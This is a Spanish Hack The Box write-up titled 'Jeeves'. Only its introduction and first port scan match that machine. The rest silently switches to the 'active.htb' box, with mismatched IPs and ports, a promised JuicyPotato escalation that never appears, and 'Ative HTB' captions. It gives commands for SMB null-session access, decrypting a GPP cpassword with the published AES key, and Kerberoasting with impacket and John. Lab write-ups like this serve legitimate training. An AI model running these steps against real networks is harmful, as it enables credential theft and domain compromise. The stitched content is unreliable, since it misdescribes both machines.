---
title: "Jeeves HTB WriteUp"
layout: post
---
![Ative HTB](/assets/images/Jeeves-1.png)


<h2>Presentación</h2>
Jeeves es una máquina windows que corre un servicio de jenkin que es un servidor para automatizar tareas open sources, la primera vez que hice la máquina daba con 
un archivo keepass que contenia claves, pero esta vez no fue necesaria para escalar privilegios, abusamos del privilegio SeImpersonatePrivilege para lograr convertirnos
en administrador, y jugamos con JuicyPotato para explotar el mismo.

<h2>Reconocimiento</h2>
En la fase de reconocimiento como siempre realizamos la identificacion de puertos y servicios en dos pasos, en la primera parte exportando el output en formato grep a un archivo llamado allports:
  
{% highlight bash %}
nmap -p- --open -v -n --min-rate 5000 10.10.10.63 -oG allports
{% endhighlight %}

Este es un escaneo de todos los puertos _-p-_, _-v_ verbosity para que nos represente el output por pantalla a medida que descubre puertos abiertos, _-n_ para que no aplique 
resolucion DNS y _-Pn_ para que asuma que todos los puertos estan up. 

```
[*] IP Address: 10.10.10.63
[*] Open ports: 80,135,445,5000
```

<h2>Puertos y Servicios</h2>
Con el fin de conocer un poco más de los servicios que se están ejecutando y lanzar una serie de script básico de reconocimiento para dichos puertos y servicios. 

{% highlight bash %}
nmap -p80,135,445,5000 -sCV -A -oN allservices 10.10.10.100
{% endhighlight %}

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 10:53 EDT
Nmap scan report for 10.10.10.63
Host is up (0.49s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

```

Aqui podemos identificar dos servicios http en diferente puertos, puerto 80 y 50000 respectivamente, tecnologia de Microsoft IIS y Jetty 9.4.x; es bueno identificar 
estas versiones para luego buscar en exploit-DB o seachsploit vulnerabilidades asociadas a la misma, que quizas para nuestra version enumerada solo aparece un _Information Disclosure_
en un archivo *txt*.

Podemos observar el OS que detecta nmap _windows_server_2008 r2_ que podemos comprobar una vez ganemos accesos con el comando _system info_.

![Ative HTB](/assets/images/services.png)

<h2> SMB smbmap % smbclient </h2>
A través de smbclient nos conectamos al directorio que tenemos acceso de lectura como nos indicó el comando, en este caso el directorio \Replication, luego de mapear dicho directorios con el comando smbmap que nos lista los permisos de los directorios, es decir si tenemos permisos de lectura y escritura:

{% highlight bash %}
smbmap -H 10.10.10.100
{% endhighlight %}

Con smbclient haciendo uso de un null session accedimos a listar dicho directorio y su contenido.
{% highlight bash %}
smbclient //10.10.10.100/Replicacion -U ""%""
{% endhighlight %}

![Ative HTB](/assets/images/smbclient.png)

Luego de navegar por el directorio policies en busca de algo interesante y observando cada archivo hasta dar con el archivo groups.xml, que según el siguiente article de [Hacking-Article][Hacking-Article] es creado como consecuencia de la configuración de Group Policy Preference, en la que permiten a un administrador crear policies e instalar aplicaciones a través de Group Policy. Y sobre la cual se guarda una contraseña encriptada en formato _cpassword_, y de la cual Microsoft publicó la llave, como podemos observar en el siguiente artículo, [Microsoft][Microsoft], trasladamos el contenido de dicha carpeta a nuestra carpeta content y efectivamente, como se puede observar, obtenemos las credenciales del usuario SVC_TGS:

{% highlight bash %} <?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups> {% endhighlight %}

Desencriptamos la contraseña con el uso de la herramienta gpp-decrypt:

![Ative HTB](/assets/images/ggp.png)

también podemos hacer uso de el siguiente one-liner ya que conocemos la llave como mencionamos anteriormente:
{% highlight bash %} 
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 
{% endhighlight %}

<h2>Validación de credenciales</h2>

Utilizamos la herramienta crackmapexec.py del poderoso _impacket_ para verificar la autenticidad de dicho usuario en el dominio **active.htb**, las cuales resultaron ser válida aunque no obtuvimos un (Pwned!) e intentamos verificar si podiamos loguearnos a traves de winrm, pero no fue así. 

![Ative HTB](/assets/images/gpp.png)

**Nota** desde aqui podemos visualizar la flag del user, haciendo uso de smbclient y navegando entre directorios :)

{% highlight bash %} smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingSt----8 {% endhighlight %}

Pero teniendo un usuario y contraseña, se nos hace posible realizar un Kerberoasting attack, el cual TCM Security explica detallamente, que nos _dumpea_ los krbasrep5 hashes de las cuentas que tienen _UserAccountControl setting “Do not require Kerberos preauthentication” habilitada_ pero que explico con más detalle en el siguiente artículo, sobre mis apuntes. 
Para esto utilizamos la herramienta _GetUserSPNs.py_, del poderoso impacket 🏅  

{% highlight bash %} GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS {% endhighlight %}

obtenemos el hash NTLMv2, enviamos a un archivo de texto y utilizamos John The Ripper, para obtener la credencial en texto plano.

![Ative HTB](/assets/images/hash.png)

y ya obteniendo credenciales de administrador como nos muestra la primera línea del output del GetUserSPNs.py, y contraseña nos logueamos en el sistema. 

![Ative HTB](/assets/images/psexec.png)

Ya siendo Nt Authority\System, a buscar las flags.
Que he decidido mostrar solo si existe algún paso más para llegar a ellas, no que tan solo sea navegar entre directorios como es este el caso, para poder verla. 

🖱️_by:_ *@DaVinciRoot*

[Hacking-Article]: https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/
[Microsoft]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0
